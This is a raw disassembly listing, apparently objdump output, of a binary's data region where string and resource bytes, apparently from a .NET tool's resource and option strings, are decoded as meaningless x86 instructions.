  408044:	popa   
  408045:	jns    0x408047
  408047:	push   ebx
  408048:	jns    0x4080bd
  40804a:	je     0x4080b1
  40804c:	ins    DWORD PTR es:[edi],dx
  40804d:	cs push edi
  40804f:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  408056:	inc    esi
  408057:	outs   dx,DWORD PTR ds:[esi]
  408058:	jb     0x4080c7
  40805a:	jae    0x40805c
  40805c:	push   edx
  40805d:	gs jae 0x4080b8
  408060:	push   edx
  408061:	gs jae 0x4080d3
  408064:	jne    0x4080d8
  408066:	arpl   WORD PTR [ebp+0x52],sp
  408069:	gs popa 
  40806b:	fs gs jb 0x40806f
  40806f:	inc    edi
  408070:	gs je  0x4080b9
  408073:	jne    0x4080e1
  408075:	ins    BYTE PTR es:[edi],dx
  408076:	push   eax
  408077:	popa   
  408078:	je     0x4080e2
  40807a:	add    BYTE PTR [edi+0x65],al
  40807d:	je     0x4080c3
  40807f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  408086:	jns    0x4080d6
  408088:	popa   
  408089:	ins    DWORD PTR es:[edi],dx
  40808a:	add    BYTE PTR gs:[ebx+0x65],dh
  40808e:	je     0x4080ef
  408090:	inc    edx
  408091:	popa   
  408092:	jae    0x4080f9
  408094:	push   eax
  408095:	popa   
  408096:	je     0x408100
  408098:	add    BYTE PTR [edx+0x65],dl
  40809b:	jae    0x40810c
  40809d:	jne    0x408111
  40809f:	arpl   WORD PTR [ebp+0x52],sp
  4080a2:	gs popa 
  4080a4:	fs gs jb 0x4080a8
  4080a8:	dec    ecx
  4080a9:	inc    esp
  4080aa:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  4080b1:	jb     0x40812c
  4080b3:	inc    ebp
  4080b4:	outs   dx,BYTE PTR ds:[esi]
  4080b5:	jne    0x408124
  4080b7:	gs jb  0x40811b
  4080ba:	je     0x40812b
  4080bc:	jb     0x4080be
  4080be:	addr16 gs je 0x408121
  4080c2:	dec    ebx
  4080c3:	gs jns 0x4080c6
  4080c6:	addr16 gs je 0x408129
  4080ca:	push   esi
  4080cb:	popa   
  4080cc:	ins    BYTE PTR es:[edi],dx
  4080cd:	jne    0x408134
  4080cf:	add    BYTE PTR [ecx+0x45],cl
  4080d2:	outs   dx,BYTE PTR ds:[esi]
  4080d3:	jne    0x408142
  4080d5:	gs jb  0x408139
  4080d8:	je     0x408149
  4080da:	jb     0x4080dc
  4080dc:	push   esp
  4080dd:	gs js  0x408154
  4080e0:	push   edx
  4080e1:	gs popa 
  4080e3:	fs gs jb 0x4080e7
  4080e7:	jae    0x40814e
  4080e9:	je     0x40814a
  4080eb:	dec    esp
  4080ec:	outs   dx,BYTE PTR gs:[esi]
  4080ee:	addr16 je 0x408159
  4080f1:	add    BYTE PTR [ebp+0x49],dl
  4080f4:	outs   dx,BYTE PTR ds:[esi]
  4080f5:	je     0x408128
  4080f7:	add    BYTE PTR ss:[esi+0x75],cl
  4080fb:	ins    DWORD PTR es:[edi],dx
  4080fc:	bound  esp,QWORD PTR [ebp+0x72]
  4080ff:	push   ebx
  408100:	je     0x40817b
  408102:	ins    BYTE PTR es:[edi],dx
  408103:	gs jae 0x408106
  408106:	push   eax
  408107:	popa   
  408108:	jb     0x40817d
  40810a:	add    BYTE PTR gs:[edx+0x65],dl
  40810e:	jae    0x408168
  408110:	push   edx
  408111:	gs jae 0x408183
  408114:	jne    0x408188
  408116:	arpl   WORD PTR [ebp+0x57],sp
  408119:	jb     0x408184
  40811b:	je     0x408182
  40811d:	jb     0x40811f
  40811f:	push   edx
  408120:	gs jae 0x408192
  408123:	jne    0x408197
  408125:	arpl   WORD PTR [ebp+0x57],sp
  408128:	jb     0x408193
  40812a:	je     0x408191
  40812c:	jb     0x40812e
  40812e:	inc    ebx
  40812f:	ins    BYTE PTR es:[edi],dx
  408130:	outs   dx,DWORD PTR ds:[esi]
  408131:	jae    0x408198
  408133:	add    BYTE PTR [edi+0x65],ah
  408136:	je     0x408197
  408138:	push   ebp
  408139:	push   esp
  40813a:	inc    esi
  40813b:	cmp    BYTE PTR [eax],al
  40813d:	push   edx
  40813e:	gs jo  0x4081ad
  408141:	popa   
  408142:	arpl   WORD PTR [ebp+0x0],sp
  408145:	addr16 gs je 0x4081a8
  408149:	push   esi
  40814a:	gs jb  0x4081c0
  40814d:	imul   ebp,DWORD PTR [edi+0x6e],0x6d6f4300
  408154:	jo     0x4081bf
  408156:	ins    BYTE PTR es:[edi],dx
  408157:	gs jb  0x4081a3
  40815a:	outs   dx,BYTE PTR ds:[esi]
  40815b:	outs   dx,WORD PTR ds:[esi]
  40815d:	add    BYTE PTR [edi+0x65],al
  408160:	je     0x4081a3
  408162:	ins    BYTE PTR es:[edi],dx
  408163:	ins    BYTE PTR es:[edi],dx
  408164:	inc    ebx
  408165:	outs   dx,DWORD PTR ds:[esi]
  408166:	ins    DWORD PTR es:[edi],dx
  408167:	jo     0x4081d2
  408169:	ins    BYTE PTR es:[edi],dx
  40816a:	gs jb  0x4081b6
  40816d:	outs   dx,BYTE PTR ds:[esi]
  40816e:	outs   dx,WORD PTR ds:[esi]
  408170:	add    BYTE PTR [edi+0x65],al
  408173:	je     0x4081c1
  408175:	popa   
  408176:	outs   dx,BYTE PTR ds:[esi]
  408177:	addr16 jne 0x4081db
  40817a:	addr16 gs jae 0x40817e
  40817e:	push   ebx
  40817f:	je     0x4081f3
  408181:	imul   ebp,DWORD PTR [esi+0x67],0x706d6f43
  408188:	popa   
  408189:	jb     0x4081f0
  40818b:	jb     0x40818d
  40818d:	addr16 gs je 0x4081f0
  408191:	dec    edi
  408192:	jb     0x4081f8
  408194:	imul   ebp,DWORD PTR [esi+0x61],0x6e67496c
  40819b:	outs   dx,DWORD PTR ds:[esi]
  40819c:	jb     0x408203
  40819e:	inc    ebx
  40819f:	popa   
  4081a0:	jae    0x408207
  4081a2:	add    BYTE PTR [ecx+0x45],cl
  4081a5:	jno    0x40821c
  4081a7:	popa   
  4081a8:	ins    BYTE PTR es:[edi],dx
  4081a9:	imul   esi,DWORD PTR [ecx+edi*2+0x43],0x61706d6f
  4081b1:	jb     0x408218
  4081b3:	jb     0x4081b5
  4081b5:	dec    esi
  4081b6:	outs   dx,DWORD PTR ds:[esi]
  4081b7:	je     0x408202
  4081b9:	ins    DWORD PTR es:[edi],dx
  4081ba:	jo     0x408228
  4081bc:	gs ins DWORD PTR es:[edi],dx
  4081be:	outs   dx,BYTE PTR gs:[esi]
  4081c0:	je     0x408227
  4081c2:	fs inc ebp
  4081c4:	js     0x408229
  4081c6:	gs jo  0x40823d
  4081c9:	imul   ebp,DWORD PTR [edi+0x6e],0x2e525300
  4081d0:	jb     0x408237
  4081d2:	jae    0x408243
  4081d4:	jne    0x408248
  4081d6:	arpl   WORD PTR [ebp+0x73],sp
  4081d9:	add    BYTE PTR [ebx+0x6f],al
  4081dc:	ins    DWORD PTR es:[edi],dx
  4081dd:	ins    DWORD PTR es:[edi],dx
  4081de:	outs   dx,DWORD PTR ds:[esi]
  4081df:	outs   dx,BYTE PTR ds:[esi]
  4081e0:	push   edx
  4081e1:	gs jae 0x408237
  4081e4:	je     0x408258
  4081e6:	imul   ebp,DWORD PTR [esi+0x67],0x65722e73
  4081ed:	jae    0x40825e
  4081ef:	jne    0x408263
  4081f1:	arpl   WORD PTR [ebp+0x73],sp
  4081f4:	add    BYTE PTR [eax],al
  4081f6:	add    BYTE PTR [eax],al
  4081f8:	add    BYTE PTR [ecx+0x4d],cl
  4081fb:	add    BYTE PTR [ecx+0x0],ch
  4081fe:	arpl   WORD PTR [eax],ax
  408200:	jb     0x408202
  408202:	outs   dx,DWORD PTR ds:[esi]
  408203:	add    BYTE PTR [ebx+0x0],dh
  408206:	outs   dx,DWORD PTR ds:[esi]
  408207:	add    BYTE PTR [esi+0x0],ah
  40820a:	je     0x40820c
  40820c:	pop    edi
  40820d:	add    BYTE PTR [ebx+0x0],al
  408210:	outs   dx,DWORD PTR ds:[esi]
  408211:	add    BYTE PTR [eax+0x0],dh
  408214:	jns    0x408216
  408216:	jb     0x408218
  408218:	imul   eax,DWORD PTR [eax],0x680067
  40821e:	je     0x408220
  408220:	pop    edi
  408221:	add    BYTE PTR [ebx+0x0],al
  408224:	outs   dx,DWORD PTR ds:[esi]
  408225:	add    BYTE PTR [ebp+0x0],ch
  408228:	ins    DWORD PTR es:[edi],dx
  408229:	add    BYTE PTR [ecx+0x0],ah
  40822c:	outs   dx,BYTE PTR ds:[esi]
  40822d:	add    BYTE PTR [eax+eax*1+0x4c],ah
  408231:	add    BYTE PTR [ecx+0x0],ch
  408234:	outs   dx,BYTE PTR ds:[esi]
  408235:	add    BYTE PTR [ebp+0x0],ah
  408238:	pop    edi
  408239:	add    BYTE PTR [eax+eax*1+0x6f],cl
  40823d:	add    BYTE PTR [edi+0x0],ah
  408240:	outs   dx,DWORD PTR ds:[esi]
  408241:	add    BYTE PTR [eax],al
  408243:	cmp    eax,0x430057
  408248:	inc    esi
  408249:	add    BYTE PTR [edi+0x0],bl
  40824c:	push   esp
  40824d:	add    BYTE PTR [edx+0x0],dh
  408250:	popa   
  408251:	add    BYTE PTR [eax+eax*1+0x65],ah
  408255:	add    BYTE PTR [ebp+0x0],ch
  408258:	popa   
  408259:	add    BYTE PTR [edx+0x0],dh
  40825c:	imul   eax,DWORD PTR [eax],0x5f
  40825f:	add    BYTE PTR [ebx+0x0],al
  408262:	outs   dx,DWORD PTR ds:[esi]
  408263:	add    BYTE PTR [ebp+0x0],ch
  408266:	ins    DWORD PTR es:[edi],dx
  408267:	add    BYTE PTR [ecx+0x0],ah
  40826a:	outs   dx,BYTE PTR ds:[esi]
  40826b:	add    BYTE PTR [eax+eax*1+0x4c],ah
  40826f:	add    BYTE PTR [ecx+0x0],ch
  408272:	outs   dx,BYTE PTR ds:[esi]
  408273:	add    BYTE PTR [ebp+0x0],ah
  408276:	pop    edi
  408277:	add    BYTE PTR [eax+eax*1+0x6f],cl
  40827b:	add    BYTE PTR [edi+0x0],ah
  40827e:	outs   dx,DWORD PTR ds:[esi]
  40827f:	add    BYTE PTR [eax],al
  408281:	and    DWORD PTR [ebx+0x0],eax
  408284:	outs   dx,DWORD PTR ds:[esi]
  408285:	add    BYTE PTR [ebp+0x0],ch
  408288:	ins    DWORD PTR es:[edi],dx
  408289:	add    BYTE PTR [edi+0x0],ch
  40828c:	outs   dx,BYTE PTR ds:[esi]
  40828d:	add    BYTE PTR [edx+0x0],dl
  408290:	add    BYTE PTR gs:[ebx+0x0],dh
  408294:	push   ebx
  408295:	add    BYTE PTR [eax+eax*1+0x72],dh
  408299:	add    BYTE PTR [ecx+0x0],ch
  40829c:	outs   dx,BYTE PTR ds:[esi]
  40829d:	add    BYTE PTR [edi+0x0],ah
  4082a0:	jae    0x4082a2
  4082a2:	add    BYTE PTR ds:0x520053,al
  4082a8:	add    BYTE PTR [edi],al
  4082aa:	add    BYTE PTR cs:[esi],ch
  4082ad:	add    BYTE PTR [esi],ch
  4082af:	add    BYTE PTR [eax],al
  4082b1:	sub    DWORD PTR [eax+eax*1+0x75],eax
  4082b5:	add    BYTE PTR [eax+0x0],dh
  4082b8:	ins    BYTE PTR es:[edi],dx
  4082b9:	add    BYTE PTR [ecx+0x0],ch
  4082bc:	arpl   WORD PTR [eax],ax
  4082be:	popa   
  4082bf:	add    BYTE PTR [eax+eax*1+0x65],dh
  4082c3:	add    BYTE PTR [edx+0x0],dl
  4082c6:	add    BYTE PTR gs:[ebx+0x0],dh
  4082ca:	outs   dx,DWORD PTR ds:[esi]
  4082cb:	add    BYTE PTR [ebp+0x0],dh
  4082ce:	jb     0x4082d0
  4082d0:	arpl   WORD PTR [eax],ax
  4082d2:	add    BYTE PTR gs:[ebx+0x0],cl
  4082d6:	add    BYTE PTR gs:[ecx+0x0],bh
  4082da:	add    BYTE PTR ds:0x650052,bh
  4082e0:	jae    0x4082e2
  4082e2:	inc    edi
  4082e3:	add    BYTE PTR [ebp+0x0],ah
  4082e6:	outs   dx,BYTE PTR ds:[esi]
  4082e7:	add    BYTE PTR [eax],ah
  4082e9:	add    BYTE PTR [edx],bh
  4082eb:	add    BYTE PTR [eax],ah
  4082ed:	add    BYTE PTR [ebp+0x0],ah
  4082f0:	jb     0x4082f2
  4082f2:	jb     0x4082f4
  4082f4:	outs   dx,DWORD PTR ds:[esi]
  4082f5:	add    BYTE PTR [edx+0x0],dh
  4082f8:	and    BYTE PTR [eax],al
  4082fa:	push   edx
  4082fb:	add    BYTE PTR [edi+0x0],al
  4082fe:	jnp    0x408300
  408300:	xor    DWORD PTR [eax],eax
  408302:	cmp    al,BYTE PTR [eax]
  408304:	xor    BYTE PTR [eax],al
  408306:	xor    BYTE PTR [eax],al
  408308:	xor    BYTE PTR [eax],al
  40830a:	xor    BYTE PTR [eax],al
  40830c:	jge    0x40830e
  40830e:	cmp    al,BYTE PTR [eax]
  408310:	and    BYTE PTR [eax],al
  408312:	jnp    0x408314
  408314:	xor    BYTE PTR [eax],al
  408316:	jge    0x408318
  408318:	add    BYTE PTR [edi],dh
  40831a:	jnp    0x40831c
  40831c:	xor    BYTE PTR [eax],al
  40831e:	jge    0x408320
  408320:	and    BYTE PTR [eax],al
  408322:	cmp    al,BYTE PTR [eax]
  408324:	and    BYTE PTR [eax],al
  408326:	add    BYTE PTR gs:[edx+0x0],dh
  40832a:	jb     0x40832c
  40832c:	outs   dx,DWORD PTR ds:[esi]
  40832d:	add    BYTE PTR [edx+0x0],dh
  408330:	and    BYTE PTR [eax],al
  408332:	push   edx
  408333:	add    BYTE PTR [edi+0x0],al
  408336:	jnp    0x408338
  408338:	xor    DWORD PTR [eax],eax
  40833a:	cmp    al,BYTE PTR [eax]
  40833c:	xor    BYTE PTR [eax],al
  40833e:	xor    BYTE PTR [eax],al
  408340:	xor    BYTE PTR [eax],al
  408342:	xor    BYTE PTR [eax],al
  408344:	jge    0x408346
  408346:	cmp    al,BYTE PTR [eax]
  408348:	and    BYTE PTR [eax],al
  40834a:	jnp    0x40834c
  40834c:	xor    al,BYTE PTR [eax]
  40834e:	jge    0x408350
  408350:	add    BYTE PTR [edi+0x7b],al
  408353:	add    BYTE PTR [eax],dh
  408355:	add    BYTE PTR [ebp+0x0],bh
  408358:	sub    BYTE PTR [eax],al
  40835a:	jnp    0x40835c
  40835c:	xor    DWORD PTR [eax],eax
  40835e:	jge    0x408360
  408360:	sub    al,0x0
  408362:	jnp    0x408364
  408364:	xor    al,BYTE PTR [eax]
  408366:	jge    0x408368
  408368:	sub    DWORD PTR [eax],eax
  40836a:	cmp    al,BYTE PTR [eax]
  40836c:	and    BYTE PTR [eax],al
  40836e:	add    BYTE PTR gs:[edx+0x0],dh
  408372:	jb     0x408374
  408374:	outs   dx,DWORD PTR ds:[esi]
  408375:	add    BYTE PTR [edx+0x0],dh
  408378:	and    BYTE PTR [eax],al
  40837a:	push   edx
  40837b:	add    BYTE PTR [edi+0x0],al
  40837e:	jnp    0x408380
  408380:	xor    eax,DWORD PTR [eax]
  408382:	cmp    al,BYTE PTR [eax]
  408384:	xor    BYTE PTR [eax],al
  408386:	xor    BYTE PTR [eax],al
  408388:	xor    BYTE PTR [eax],al
  40838a:	xor    BYTE PTR [eax],al
  40838c:	jge    0x40838e
  40838e:	cmp    al,BYTE PTR [eax]
  408390:	and    BYTE PTR [eax],al
  408392:	jnp    0x408394
  408394:	xor    al,0x0
  408396:	jge    0x408398
  408398:	add    BYTE PTR [ebx],bh
  40839a:	push   edx
  40839b:	add    BYTE PTR [ebp+0x0],ah
  40839e:	jae    0x4083a0
  4083a0:	inc    edi
  4083a1:	add    BYTE PTR [ebp+0x0],ah
  4083a4:	outs   dx,BYTE PTR ds:[esi]
  4083a5:	add    BYTE PTR [eax],ah
  4083a7:	add    BYTE PTR [edx],bh
  4083a9:	add    BYTE PTR [eax],ah
  4083ab:	add    BYTE PTR [edi+0x0],dh
  4083ae:	popa   
  4083af:	add    BYTE PTR [edx+0x0],dh
  4083b2:	outs   dx,BYTE PTR ds:[esi]
  4083b3:	add    BYTE PTR [ecx+0x0],ch
  4083b6:	outs   dx,BYTE PTR ds:[esi]
  4083b7:	add    BYTE PTR [edi+0x0],ah
  4083ba:	and    BYTE PTR [eax],al
  4083bc:	push   edx
  4083bd:	add    BYTE PTR [edi+0x0],al
  4083c0:	xor    BYTE PTR [eax],al
  4083c2:	xor    BYTE PTR [eax],al
  4083c4:	xor    BYTE PTR [eax],al
  4083c6:	xor    BYTE PTR [eax],al
  4083c8:	and    BYTE PTR [eax],al
  4083ca:	cmp    al,BYTE PTR [eax]
  4083cc:	and    BYTE PTR [eax],al
  4083ce:	jnp    0x4083d0
  4083d0:	xor    BYTE PTR [eax],al
  4083d2:	jge    0x4083d4
  4083d4:	add    BYTE PTR [ebx],bh
  4083d6:	jnp    0x4083d8
  4083d8:	xor    BYTE PTR [eax],al
  4083da:	jge    0x4083dc
  4083dc:	and    BYTE PTR [eax],al
  4083de:	cmp    al,BYTE PTR [eax]
  4083e0:	and    BYTE PTR [eax],al
  4083e2:	ja     0x4083e4
  4083e4:	popa   
  4083e5:	add    BYTE PTR [edx+0x0],dh
  4083e8:	outs   dx,BYTE PTR ds:[esi]
  4083e9:	add    BYTE PTR [ecx+0x0],ch
  4083ec:	outs   dx,BYTE PTR ds:[esi]
  4083ed:	add    BYTE PTR [edi+0x0],ah
  4083f0:	and    BYTE PTR [eax],al
  4083f2:	push   edx
  4083f3:	add    BYTE PTR [edi+0x0],al
  4083f6:	jnp    0x4083f8
  4083f8:	xor    DWORD PTR [eax],eax
  4083fa:	cmp    al,BYTE PTR [eax]
  4083fc:	xor    BYTE PTR [eax],al
  4083fe:	xor    BYTE PTR [eax],al
  408400:	xor    BYTE PTR [eax],al
  408402:	xor    BYTE PTR [eax],al
  408404:	jge    0x408406
  408406:	cmp    al,BYTE PTR [eax]
  408408:	and    BYTE PTR [eax],al
  40840a:	jnp    0x40840c
  40840c:	xor    al,BYTE PTR [eax]
  40840e:	jge    0x408410
  408410:	add    BYTE PTR [ebx+0x7b],cl
  408413:	add    BYTE PTR [eax],dh
  408415:	add    BYTE PTR [ebp+0x0],bh
  408418:	sub    BYTE PTR [eax],al
  40841a:	jnp    0x40841c
  40841c:	xor    DWORD PTR [eax],eax
  40841e:	jge    0x408420
  408420:	sub    al,0x0
  408422:	jnp    0x408424
  408424:	xor    al,BYTE PTR [eax]
  408426:	jge    0x408428
  408428:	sub    DWORD PTR [eax],eax
  40842a:	cmp    al,BYTE PTR [eax]
  40842c:	and    BYTE PTR [eax],al
  40842e:	ja     0x408430
  408430:	popa   
  408431:	add    BYTE PTR [edx+0x0],dh
  408434:	outs   dx,BYTE PTR ds:[esi]
  408435:	add    BYTE PTR [ecx+0x0],ch
  408438:	outs   dx,BYTE PTR ds:[esi]
  408439:	add    BYTE PTR [edi+0x0],ah
  40843c:	and    BYTE PTR [eax],al
  40843e:	push   edx
  40843f:	add    BYTE PTR [edi+0x0],al
  408442:	jnp    0x408444
  408444:	xor    eax,DWORD PTR [eax]
  408446:	cmp    al,BYTE PTR [eax]
  408448:	xor    BYTE PTR [eax],al
  40844a:	xor    BYTE PTR [eax],al
  40844c:	xor    BYTE PTR [eax],al
  40844e:	xor    BYTE PTR [eax],al
  408450:	jge    0x408452
  408452:	cmp    al,BYTE PTR [eax]
  408454:	and    BYTE PTR [eax],al
  408456:	jnp    0x408458
  408458:	xor    al,0x0
  40845a:	jge    0x40845c
  40845c:	add    BYTE PTR [ecx],cl
  40845e:	add    BYTE PTR cs:[eax+eax*1+0x78],dh
  408463:	add    BYTE PTR [eax+eax*1+0x0],dh
  408467:	adc    DWORD PTR [esi],ebp
  408469:	add    BYTE PTR [edx+0x0],dh
  40846c:	add    BYTE PTR gs:[ebx+0x0],dh
  408470:	je     0x408472
  408472:	add    BYTE PTR gs:[eax+0x0],bh
  408476:	je     0x408478
  408478:	add    BYTE PTR [ebx],cl
  40847a:	add    BYTE PTR cs:[edx+0x0],dh
  40847e:	add    BYTE PTR gs:[ebx+0x0],dh
  408482:	js     0x408484
  408484:	add    BYTE PTR ds:0x72002e,dl
  40848a:	add    BYTE PTR gs:[ebx+0x0],dh
  40848e:	outs   dx,DWORD PTR ds:[esi]
  40848f:	add    BYTE PTR [ebp+0x0],dh
  408492:	jb     0x408494
  408494:	arpl   WORD PTR [eax],ax
  408496:	add    BYTE PTR gs:[ebx+0x0],dh
  40849a:	add    BYTE PTR [ecx],ch
  40849c:	push   ebp
  40849d:	add    BYTE PTR [esi+0x0],ch
  4084a0:	imul   eax,DWORD PTR [eax],0x6e
  4084a3:	add    BYTE PTR [edi+0x0],ch
  4084a6:	ja     0x4084a8
  4084a8:	outs   dx,BYTE PTR ds:[esi]
  4084a9:	add    BYTE PTR [esi+0x0],al
  4084ac:	imul   eax,DWORD PTR [eax],0x65006c
  4084b2:	inc    ebp
  4084b3:	add    BYTE PTR [eax+0x0],bh
  4084b6:	je     0x4084b8
  4084b8:	add    BYTE PTR gs:[esi+0x0],ch
  4084bc:	jae    0x4084be
  4084be:	imul   eax,DWORD PTR [eax],0x6e006f
  4084c4:	add    BYTE PTR ds:0x68002d,al
  4084ca:	add    DWORD PTR ds:0x3f002d,eax
  4084d0:	add    DWORD PTR ds:0x68002f,eax
  4084d6:	add    BYTE PTR ds:0x3f002f,al
  4084dc:	add    BYTE PTR [ecx],dl
  4084de:	das    
  4084df:	add    BYTE PTR [ebx+0x0],ah
  4084e2:	outs   dx,DWORD PTR ds:[esi]
  4084e3:	add    BYTE PTR [ebp+0x0],ch
  4084e6:	jo     0x4084e8
  4084e8:	imul   eax,DWORD PTR [eax],0x65006c
  4084ee:	add    BYTE PTR [ebx],al
  4084f0:	sub    al,0x0
  4084f2:	add    BYTE PTR [ecx],ah
  4084f4:	inc    edx
  4084f5:	add    BYTE PTR [ecx+0x0],ah
  4084f8:	add    BYTE PTR fs:[esi+0x0],al
  4084fc:	imul   eax,DWORD PTR [eax],0x65006c
  408502:	inc    ebp
  408503:	add    BYTE PTR [eax+0x0],bh
  408506:	je     0x408508
  408508:	add    BYTE PTR gs:[esi+0x0],ch
  40850c:	jae    0x40850e
  40850e:	imul   eax,DWORD PTR [eax],0x6e006f
  408514:	add    BYTE PTR ds:0x61004d,ch
  40851a:	ins    BYTE PTR es:[edi],dx
  40851b:	add    BYTE PTR [esi+0x0],ah
  40851e:	outs   dx,DWORD PTR ds:[esi]
  40851f:	add    BYTE PTR [edx+0x0],dh
  408522:	ins    DWORD PTR es:[edi],dx
  408523:	add    BYTE PTR [ebp+0x0],ah
  408526:	add    BYTE PTR fs:[ebx+0x0],al
  40852a:	outs   dx,DWORD PTR ds:[esi]
  40852b:	add    BYTE PTR [ebp+0x0],ch
  40852e:	jo     0x408530
  408530:	imul   eax,DWORD PTR [eax],0x65006c
  408536:	push   ebx
  408537:	add    BYTE PTR [eax+eax*1+0x72],dh
  40853b:	add    BYTE PTR [ecx+0x0],ch
  40853e:	outs   dx,BYTE PTR ds:[esi]
  40853f:	add    BYTE PTR [edi+0x0],ah
  408542:	add    BYTE PTR [ecx],dh
  408544:	dec    ecx
  408545:	add    BYTE PTR [esi+0x0],ch
  408548:	jbe    0x40854a
  40854a:	popa   
  40854b:	add    BYTE PTR [eax+eax*1+0x69],ch
  40854f:	add    BYTE PTR [eax+eax*1+0x43],ah
  408553:	add    BYTE PTR [edi+0x0],ch
  408556:	ins    DWORD PTR es:[edi],dx
  408557:	add    BYTE PTR [ebp+0x0],ch
  40855a:	popa   
  40855b:	add    BYTE PTR [esi+0x0],ch
  40855e:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  408563:	add    BYTE PTR [esi+0x0],ch
  408566:	add    BYTE PTR gs:[ebx+0x0],dl
  40856a:	jns    0x40856c
  40856c:	outs   dx,BYTE PTR ds:[esi]
  40856d:	add    BYTE PTR [eax+eax*1+0x61],dh
  408571:	add    BYTE PTR [eax+0x0],bh
  408574:	add    BYTE PTR [ebx],cl
  408576:	das    
  408577:	add    BYTE PTR [ebx+0x0],dh
  40857a:	je     0x40857c
  40857c:	jb     0x40857e
  40857e:	cmp    al,BYTE PTR [eax]
  408580:	add    BYTE PTR [edi],al
  408582:	das    
  408583:	add    BYTE PTR [edx+0x0],dh
  408586:	cmp    al,BYTE PTR [eax]
  408588:	add    BYTE PTR [edi],al
  40858a:	sub    eax,0x3a007200
  40858f:	add    BYTE PTR [ecx],al
  408591:	and    DWORD PTR [ebx+0x0],eax
  408594:	popa   
  408595:	add    BYTE PTR [esi+0x0],ch
  408598:	je     0x40859a
  40859a:	dec    esp
  40859b:	add    BYTE PTR [edi+0x0],ch
  40859e:	popa   
  40859f:	add    BYTE PTR [eax+eax*1+0x41],ah
  4085a3:	add    BYTE PTR [ebx+0x0],dh
  4085a6:	jae    0x4085a8
  4085a8:	add    BYTE PTR gs:[ebp+0x0],ch
  4085ac:	bound  eax,QWORD PTR [eax]
  4085ae:	ins    BYTE PTR es:[edi],dx
  4085af:	add    BYTE PTR [ecx+0x0],bh
  4085b2:	add    BYTE PTR ds:0x75002f,bl
  4085b8:	jae    0x4085ba
  4085ba:	add    BYTE PTR gs:[ebx+0x0],dh
  4085be:	outs   dx,DWORD PTR ds:[esi]
  4085bf:	add    BYTE PTR [ebp+0x0],dh
  4085c2:	jb     0x4085c4
  4085c4:	arpl   WORD PTR [eax],ax
  4085c6:	add    BYTE PTR gs:[eax+0x0],dh
  4085ca:	popa   
  4085cb:	add    BYTE PTR [eax+eax*1+0x68],dh
  4085cf:	add    BYTE PTR [eax],al
  4085d1:	sbb    eax,0x75002d
  4085d6:	jae    0x4085d8
  4085d8:	add    BYTE PTR gs:[ebx+0x0],dh
  4085dc:	outs   dx,DWORD PTR ds:[esi]
  4085dd:	add    BYTE PTR [ebp+0x0],dh
  4085e0:	jb     0x4085e2
  4085e2:	arpl   WORD PTR [eax],ax
  4085e4:	add    BYTE PTR gs:[eax+0x0],dh
  4085e8:	popa   
  4085e9:	add    BYTE PTR [eax+eax*1+0x68],dh
  4085ed:	add    BYTE PTR [ecx],al
  4085ef:	sbb    DWORD PTR [edi],ebp
  4085f1:	add    BYTE PTR [eax+0x0],dh
  4085f4:	jne    0x4085f6
  4085f6:	bound  eax,QWORD PTR [eax]
  4085f8:	ins    BYTE PTR es:[edi],dx
  4085f9:	add    BYTE PTR [ecx+0x0],ch
  4085fc:	arpl   WORD PTR [eax],ax
  4085fe:	arpl   WORD PTR [eax],ax
  408600:	ins    BYTE PTR es:[edi],dx
  408601:	add    BYTE PTR [ecx+0x0],ah
  408604:	jae    0x408606
  408606:	jae    0x408608
  408608:	add    BYTE PTR [ecx],bl
  40860a:	sub    eax,0x75007000
  40860f:	add    BYTE PTR [edx+0x0],ah
  408612:	ins    BYTE PTR es:[edi],dx
  408613:	add    BYTE PTR [ecx+0x0],ch
  408616:	arpl   WORD PTR [eax],ax
  408618:	arpl   WORD PTR [eax],ax
  40861a:	ins    BYTE PTR es:[edi],dx
  40861b:	add    BYTE PTR [ecx+0x0],ah
  40861e:	jae    0x408620
  408620:	jae    0x408622
  408622:	add    DWORD PTR ds:0x6e003c,ecx
  408628:	outs   dx,DWORD PTR ds:[esi]
  408629:	add    BYTE PTR [esi+0x0],ch
  40862c:	add    BYTE PTR gs:[esi],bh
  40862f:	add    BYTE PTR [eax],al
  408631:	sub    DWORD PTR [edx+0x0],eax
  408634:	popa   
  408635:	add    BYTE PTR [eax+eax*1+0x43],ah
  408639:	add    BYTE PTR [edi+0x0],ch
  40863c:	ins    DWORD PTR es:[edi],dx
  40863d:	add    BYTE PTR [ebp+0x0],ch
  408640:	popa   
  408641:	add    BYTE PTR [esi+0x0],ch
  408644:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  408649:	add    BYTE PTR [esi+0x0],ch
  40864c:	add    BYTE PTR gs:[edi+0x0],cl
  408650:	jo     0x408652
  408652:	je     0x408654
  408654:	imul   eax,DWORD PTR [eax],0x6e006f
  40865a:	add    BYTE PTR [ecx],ch
  40865c:	inc    ebx
  40865d:	add    BYTE PTR [edi+0x0],ch
  408660:	ins    DWORD PTR es:[edi],dx
  408661:	add    BYTE PTR [eax+0x0],dh
  408664:	imul   eax,DWORD PTR [eax],0x65006c
  40866a:	inc    ecx
  40866b:	add    BYTE PTR [esi+0x0],ch
  40866e:	add    BYTE PTR fs:[ebx+0x0],dl
  408672:	push   esp
  408673:	add    BYTE PTR [edx+0x0],dl
  408676:	inc    esp
  408677:	add    BYTE PTR [edi+0x0],ch
  40867a:	outs   dx,BYTE PTR ds:[esi]
  40867b:	add    BYTE PTR [eax+eax*1+0x4d],dh
  40867f:	add    BYTE PTR [ecx+0x0],ch
  408682:	js     0x408684
  408684:	add    BYTE PTR [ecx],bl
  408686:	push   edi
  408687:	add    BYTE PTR [ecx+0x0],ah
  40868a:	jb     0x40868c
  40868c:	outs   dx,BYTE PTR ds:[esi]
  40868d:	add    BYTE PTR [ecx+0x0],ch
  408690:	outs   dx,BYTE PTR ds:[esi]
  408691:	add    BYTE PTR [edi+0x0],ah
  408694:	inc    ebx
  408695:	add    BYTE PTR [edi+0x0],ch
  408698:	jne    0x40869a
  40869a:	outs   dx,BYTE PTR ds:[esi]
  40869b:	add    BYTE PTR [eax+eax*1+0x0],dh
  40869f:	adc    eax,0x720045
  4086a4:	jb     0x4086a6
  4086a6:	outs   dx,DWORD PTR ds:[esi]
  4086a7:	add    BYTE PTR [edx+0x0],dh
  4086aa:	inc    ebx
  4086ab:	add    BYTE PTR [edi+0x0],ch
  4086ae:	jne    0x4086b0
  4086b0:	outs   dx,BYTE PTR ds:[esi]
  4086b1:	add    BYTE PTR [eax+eax*1+0x0],dh
